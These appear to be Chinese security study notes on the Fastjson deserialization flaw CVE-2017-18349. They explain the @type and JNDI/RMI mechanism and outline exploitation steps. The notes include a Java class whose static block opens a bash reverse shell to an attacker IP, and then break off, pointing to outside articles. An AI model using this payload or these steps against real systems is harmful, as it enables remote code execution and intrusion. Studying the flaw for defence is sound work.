FastJson是json解析器，可以解析JSON格式的字符串，支持把JavaBean序列化成JSON字符串，也支持从JSON字符串反序列化成JavaBean

[文章 - 搞懂RMI、JRMP、JNDI-终结篇 - 先知社区](https://xz.aliyun.com/news/6860?time__1311=YqIxg7iQoDq7qGNKQxUxiTRiDcWCtNW4D&u_atoken=f318f6540c4cf55c1b42ad77a3dd3c92&u_asig=1a0c39d517419352368525851e003c)

### 反序列化漏洞（CVE-2017-18349）

##### 版本

Fastjson1.2.24及之前版本。

##### 原理

Fastjson允许JSON字符串中包含**@type**关键字来指示目标对象的类型。这意味着反序列化时，Fastjson会尝试加载并实例化这个类型的对象。如果应用程序配置允许自动类型识别，而没有适当的限制，攻击者就可以通过构造特殊的JSON字符串来指定恶意类

**通过@type指示出现问题的自带类，然后再在值中写入远程攻击者准备好的恶意类【将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器】，服务器接受后会去远程按照@type指示的类的类别去加载（rmi协议）这个恶意类【JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE】。**

![image.png](https://image.3001.net/images/20250107/1736217818_677c94da1b8afb8416999.png!small)

##### 利用

[Fastjson反序列化漏洞原理与漏洞复现（CVE-2017-18349）-CSDN博客](https://blog.csdn.net/wangzhifei1/article/details/135531112)

1.在[dnslog](http://www.dnslog.cn/)里申请一个域名：

![img](https://i-blog.csdnimg.cn/blog_migrate/27fa2c0cfc90f0cda31027b34ede2421.png)

2.访问网站并抓包，修改请求为POST，修改 Content-Type为: application/json，添加请求内容

![img](https://i-blog.csdnimg.cn/blog_migrate/ede045ddb922e2fe4fb44ff5ce5e5190.png)

3.放包，看dnslog平台是否有回显，有的话就是存在漏洞

4.构建恶意类，创建java脚本（脚本中的IP为攻击机IP）

```
import java.lang.Runtime;
import java.lang.Process;
 
public class GetShell {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/192.168.15.128/6666 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

5.在此文件的路径进入cmd执行如下命令编译为.class文件

```
javac GetShell.java
```

![img](https://i-blog.csdnimg.cn/blog_migrate/83064479135f1dd275d9eab02c616434.png)

。。。。。。。后面看文章吧，太多了

### 	其他

fastjson的常见漏洞基本都是那个思路，具体看这个文章

[分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/419185.html)

不同版本用的类和poc不同

1.2.24之前可以用一种，1.2.47之前可以用另一种

1.2.8版本之前poc只能用项目调用的类，确定对方的项目里面有哪些依赖库，才可以使用对应的poc